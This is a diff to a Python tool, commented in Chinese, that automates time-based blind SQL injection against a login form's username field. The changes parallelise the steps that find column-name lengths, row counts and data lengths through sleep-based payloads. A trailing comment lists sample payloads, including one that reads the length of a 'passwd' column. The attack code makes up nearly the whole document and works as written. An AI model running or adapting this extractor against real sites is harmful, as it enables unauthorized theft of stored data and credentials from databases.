@@ -202,23 +202,26 @@ def get_column_num(url):
         print("......the column num of {0} table is:".format(i + 1) + str(res[i]))
 
 # 获取列名长度
-def get_length_column():
+def check_length_column(parameter):
+    table,j,url=parameter
+    for n in range(1, 100):
+        payload = "test' and if((select length(column_name) from information_schema.columns where table_name='{0}' limit {1},1)={2},sleep(2),1) #".format(table, j, n)
+        data = {"username": payload, "password": '123'}
+        start_time = time.time()
+        requests.post(url, data=data)
+        end_time = time.time()
+        use_time = end_time - start_time
+        if use_time > 1.8:return n
+
+# 获取列名长度主函数
+def get_length_column(url):
     global haveget
-    for i in range(haveget['table']['curr'][0]):
-        table = haveget['table']['curr'][i + 1]
-        for j in range(haveget['length'][table]['c0']):
-            for n in range(1, 100):
-                payload = "test' and if((select length(column_name) from information_schema.columns where table_name='{0}' limit {1},1)={2},sleep(2),1) #".format(
-                    table,j,n)
-                data = {"username": payload, "password": '123'}
-                start_time = time.time()
-                requests.post(url, data=data)
-                end_time = time.time()
-                use_time = end_time - start_time
-                if use_time > 1.8:
-                    print("......the length of {0} column {1} is:".format(table,j+1) + str(n))
-                    haveget['length'][table]['c{}'.format(j+1)] = n
-                    break
+    arg1 = [(haveget['table']['curr'][i + 1],j,url) for i in range(haveget['table']['curr'][0]) for j in range(haveget['length'][haveget['table']['curr'][i + 1]]['c0'])]
+    with mp.Pool(core_num) as p:
+        res = list(tqdm.tqdm(p.imap(check_length_column, arg1), total=len(arg1)))
+    for i in range(len(res)):
+        haveget['length'][arg1[i][0]]['c{}'.format(arg1[i][1]+1)] = res[i]
+        print("......the length of {0} column {1} is:".format(arg1[i][0],arg1[i][1]+1)+ str(res[i]))
 
 def check_column(parameter):
     table,i,j,v,url=parameter
@@ -248,27 +251,7 @@ def get_column(url):
             haveget['column'][table][i+1] = ''.join(tmp[i])
         haveget['column'][table][0] = len(tmp)
 
-def get_length_data(table,column):
-    global haveget
-    haveget['length'][table][column]={'l0':0}
-    for i in range(100):
-        f=True
-        for n in range(1, 100):
-            payload = "test' and if((select length({0}) from {1} limit {2}, 1)={3},sleep(2),null) #".format(column,table,i,n)
-            data = {"username": payload, "password": '123'}
-            start_time = time.time()
-            requests.post(url, data=data)
-            end_time = time.time()
-            use_time = end_time - start_time
-            if use_time > 1.8:
-                f=False
-                haveget['length'][table][column]['l{}'.format(i+1)]=n
-                print("......the length of {0} column {1} line {2} is:".format(table, column,i+1) + str(n))
-                break
-        if f:
-            haveget['length'][table][column]['l0'] = i
-            break
-
+# 处理选择
 def resolve_choose():
     global haveget
     '''---------------------------------处理选择--------------------------------------'''
@@ -301,6 +284,44 @@ def resolve_choose():
     except:
         haveget['data'] = {table: {column: {0: 0}}}
     return table,column
+
+# 获取表的行数
+def get_num_data(table,column):
+    global haveget
+    haveget['length'][table][column] = {'l0': 0}
+    for n in range(1, 100):
+        payload = "test' and if((select count(*) from {0})={1},sleep(2),1) #".format(table, n)
+        data = {"username": payload, "password": '123'}
+        start_time = time.time()
+        requests.post(url, data=data)
+        end_time = time.time()
+        use_time = end_time - start_time
+        if use_time > 1.8:
+            haveget['length'][table][column]['l0'] = n
+            print("......the line number of {0} table is:".format(table) + str(n))
+            break
+
+def check_length_data(parameter):
+    global haveget
+    table,column,i,url=parameter
+    for n in range(1, 100):
+        payload = "test' and if((select length({0}) from {1} limit {2}, 1)={3},sleep(2),null) #".format(column, table,i, n)
+        data = {"username": payload, "password": '123'}
+        start_time = time.time()
+        requests.post(url, data=data)
+        end_time = time.time()
+        use_time = end_time - start_time
+        if use_time > 1.8:return n
+
+# 获取每行数据长度
+def get_length_data(table,column,url):
+    global haveget
+    arg1=[(table,column,i,url) for i in range(haveget['length'][table][column]['l0'])]
+    with mp.Pool(core_num) as p:
+        res = list(tqdm.tqdm(p.imap(check_length_data, arg1), total=len(arg1)))
+    for i in range(len(res)):
+        haveget['length'][table][column]['l{}'.format(i+1)]=res[i]
+        print("......the length of {0} column {1} line {2} is:".format(table, column,i+1) + str(res[i]))
 
 def check_data(parameter):
     table,column,i,j,v,url=parameter
@@ -356,13 +377,15 @@ if __name__ == "__main__":
         logger.info('{0}  正在获取当前各表列数......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
         get_column_num(url)
         logger.info('{0}  正在获取各列名长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_length_column()
+        get_length_column(url)
         logger.info('{0}  正在获取当前表列名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
         get_column(url)
         # 处理选择
         chooseTable,chooseColumn=resolve_choose()
+        logger.info('{0}  获取表单数据行数......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+        get_num_data(chooseTable,chooseColumn)
         logger.info('{0}  获取数据长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_length_data(chooseTable, chooseColumn)
+        get_length_data(chooseTable, chooseColumn,url)
         logger.info('{0}  获取数据......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
         get_data(chooseTable,chooseColumn,url)
         logger.info('{0}  获取完毕！'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
@@ -374,6 +397,7 @@ payload:
 表单数:test' and if((select count(*) from information_schema.tables where table_schema=database())=1,sleep(2),1) #
 列数:test' and if((select count(*) from information_schema.columns where table_name='pinfo')=4,sleep(2),1) #
 列名长度：test' and if((select length(column_name) from information_schema.columns where table_name='pinfo' limit 0,1)=2,sleep(2),1) #
+数据行数：test' and if((select count(*) from sqlinject2)=2,sleep(2),1) #
 数据长度：test' and if((select length(passwd) from pinfo limit 0, 1)=6,sleep(2),null) #
 '''
 
